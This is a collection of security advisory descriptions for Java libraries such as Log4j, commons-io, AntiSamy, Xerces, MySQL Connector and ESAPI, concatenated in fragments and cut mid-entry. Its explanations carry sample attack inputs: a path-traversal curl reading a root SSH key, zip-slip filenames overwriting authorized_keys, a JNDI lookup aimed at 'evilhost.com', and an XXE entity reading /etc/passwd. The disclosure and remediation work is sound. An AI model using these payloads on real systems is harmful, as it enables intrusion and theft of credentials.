user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `commons-io:commons-io` to version 2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d)\n- [Jira Issue](https://issues.apache.org/jira/browse/IO-556)\n- [PoC](https://github.com/AlAIAL90/CVE-2021-29425)\n",

                "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) if one of the following conditions is met:\r\n\r\n1. Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f)\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [Twitter Post](https://twitter.com/marcioalm/status/1471740771581652995)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-45046.yaml)\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",

Does not protect against uncontrolled recursion from self-referential lookups. \r\n\r\nWhen the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a `StackOverflowError` that will terminate the process.\r\n\r\n### PoC\r\n\r\nIn `log4j.properties`:\r\n```java\r\nappender.console.type = Console\r\nappender.console.name = console\r\nappender.console.layout.type = PatternLayout\r\nappender.console.layout.pattern = !${ctx:test}! %m%n\r\nrootLogger.level = ALL\r\nrootLogger.appenderRef.file.ref = console\r\n```\r\n\r\nIn `Main.java`:\r\n```java\r\nThreadContext.put(\"test\", \"${::-${ctx:test}}\");\r\nlogger.error(\"boom\"); // Will not be logged\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash.

                "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) when the `preserveComments` directive is enabled and certain tags are allowed in the policy file. An attacker can execute elements in comment tags as part of a mutation XSS (mXSS) attack by crafting specific inputs.\r\n\r\n## Workaround\r\n\r\nThis vulnerability can be mitigated by manually editing the AntiSamy policy file (e.g., antisamy.xml) by deleting the `preserveComments` directive or setting its value to `false`, if present. Also, it would be beneficial to make AntiSamy remove the `noscript` tag by adding this in the tag definitions under the `<tagrules>` node (or deleting it entirely if present).\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.7.4 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/05c52b98bb845b8175b8406bd2f391ce334a05d6)\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/bf19f97a2fdecd8286e730e56bc2bdd8284b81a1)\n- [GitHub Release](https://github.com/nahsra/antisamy/releases/tag/v1.7.4)\n",

By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `mysql:mysql-connector-java` to version 8.0.27 or higher.\n## References\n- [GitHub Commit](https://github.com/mysql/mysql-connector-j/commit/4993d5735fd84a46e7d949ad1bcaa0e9bb039824)\n- [PoC](https://pyn3rd.github.io/2021/10/22/mysql-jdbc-xxe/)\n",

CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",

When using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application, an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n  \n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.8.2 or higher.\n## References\n- [Exploit](https://github.com/pimps/CVE-2017-5645)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/5dcc19215827db29c993d0305ee2b0d8dd05939d)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-1863)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5645)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/network/cves/2017/CVE-2017-5645.yaml)\n",

                "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). An attacker may be able to force the target server to parse an FTP URL, which points to an FTP server controller by the attacker. When the target server is mid way through fetching the FTP resources, the attackers malicious FTP server will exit the process and will leave the thread hanging in the target server.\r\n\r\nIt is possible to conduct this attack only if the following conditions are met:\r\n* An attacker can pass an URL parameter that points to a controlled FTP server to the target.\r\n* Target server uses vulnerable component(s) to fetch the resource specified by the attacker.\r\n* Target server does not prevent fetching of FTP URI resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.11.0 or higher.\n## References\n- [Blog Post](https://blogs.securiteam.com/index.php/archives/3271)\n- [Exploit DB](https://www.exploit-db.com/exploits/44057)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-10355)\n",

                "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) due to flawed parsing of HTML input in the `neko-htmlunit` dependency, when the `preserveComments` directive is enabled, which causes elements in comment tags to be interpreted as executable. \n\n ## Workaround \n\n This vulnerability can be mitigated by manually editing the policy file to delete the `preserveComments` directive or set its value to `false`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.7.5 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/12a2e31d3855430c119480655c2bbbbb79a66ecd)\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/3e84410ed06ab67f0a4cc3183c67528210f4847d)\n- [neko-htmlunit Fix Commit](https://github.com/HtmlUnit/htmlunit-neko/commit/27dd64a0209811979cb71b4b18798da4ca716be9)\n",

A remote attacker could use this flaw to supply crafted XML that would lead to a denial of service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.11.0.SP5 or higher.\n## References\n- [Apache-SVN](http://svn.apache.org/viewvc?view=revision&revision=1499506)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/CVE-2013-4002)\n",

By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.

The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization.

By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application, an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",

                "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `HTML` tag smuggling on `STYLE` content with a crafted input. This is due to an incomplete fix for [CVE-2022-28367](https://security.snyk.io/vuln/SNYK-JAVA-ORGOWASPANTISAMY-2774681)\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.6.7 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/32e273507da0e964b58c50fd8a4c94c9d9363af0)\n- [GitHub Release](https://github.com/nahsra/antisamy/releases/tag/v1.6.7)\n",

Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nThere is no fixed version for `org.owasp.esapi:esapi`.\n## References\n- [ESAPI Documentation](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin11.pdf)\n",

                "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to Directory Traversal via the default implementation of the `Validator.getValidDirectoryPath(String, String, File, boolean)`, which may incorrectly treat the tested input string as a child of the specified parent directory. This potentially could allow control-flow bypass checks to be defeated if an attack can specify the entire string representing the 'input' path. \r\n\r\n\r\n**Note:**\r\n As a workaround, it is possible to write one's own implementation of the Validator interface by sub-classing a version of the affected `DefaultValidator` class and then overriding the affected `getValidDirectoryPath()` to correct the issue. **However, the maintainers do not recommend this.**\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.3.0.0 or higher.\n## References\n- [GitHub 